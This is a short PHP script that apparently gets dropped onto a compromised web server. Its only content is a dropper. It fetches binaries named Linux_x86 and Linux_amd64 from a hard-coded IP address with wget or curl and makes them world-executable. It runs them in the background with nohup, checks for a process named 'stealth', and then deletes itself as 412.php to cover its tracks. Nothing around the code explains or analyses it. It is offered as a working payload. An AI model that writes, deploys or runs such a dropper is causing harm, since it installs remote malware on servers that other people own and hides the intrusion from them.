<?php
system('wget "http://82.165.106.79/Linux_x86" 2>/dev/null || curl -O  "http://82.165.106.79/Linux_x86"');
system('chmod 777 ./Linux_x86');
system('nohup ./Linux_x86 2>&1 &');
system('ps aux|stealth');

system('wget "http://82.165.106.79/Linux_amd64" 2>/dev/null || curl -O  "http://82.165.106.79/Linux_amd64"');
system('chmod 777 ./Linux_amd64');
system('nohup ./Linux_amd64 2>&1 &');
system('ps aux|grep stealth');

system('rm -rf 412.php');
?>
